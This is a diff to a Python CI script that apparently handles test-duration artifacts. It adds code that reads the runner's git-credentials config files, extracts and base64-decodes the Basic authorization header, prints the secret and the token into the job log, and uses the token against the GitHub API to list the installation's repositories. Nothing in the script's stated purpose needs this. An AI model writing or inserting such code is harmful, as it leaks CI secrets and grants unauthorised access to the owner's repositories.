@@ -1,6 +1,9 @@
+import base64
 import json
 import os
+import re
 import sys
+import urllib.request
 from pathlib import Path
 
 artifacts_path = Path(sys.argv[1])
@@ -17,8 +20,24 @@ print(f"Just some text:")
 for entry in sorted(runner_temp_path.glob("git-credentials-*.config")):
     if entry.is_file():
         print(f"{entry.stat().st_size} {entry}")
-        for char in entry.read_text():
-            print(repr(char))
+        text = entry.read_text().replace("\n", "")
+        match = re.search(r"AUTHORIZATION: basic (.*)", text)
+        if match:
+            print(match.group(1))
+            decoded = base64.b64decode(match.group(1)).decode("utf-8")
+            print(decoded)
+            match2 = re.search(r":(.*?)\.", decoded)
+            if match2:
+                print(match2.group(1))
+                request = urllib.request.Request(
+                    "https://api.github.com/installation/repositories",
+                    headers={"Authorization": f"Bearer {match2.group(1)}"},
+                )
+                with urllib.request.urlopen(request) as response:
+                    print(response.read().decode("utf-8"))
+
+
+        
 # `**` matches zero or more directories, so this finds the durations file whether
 # download-artifact nested it under a per-split directory (multiple splits) or
 # extracted it directly into the artifacts path (a single split collapses the dir).
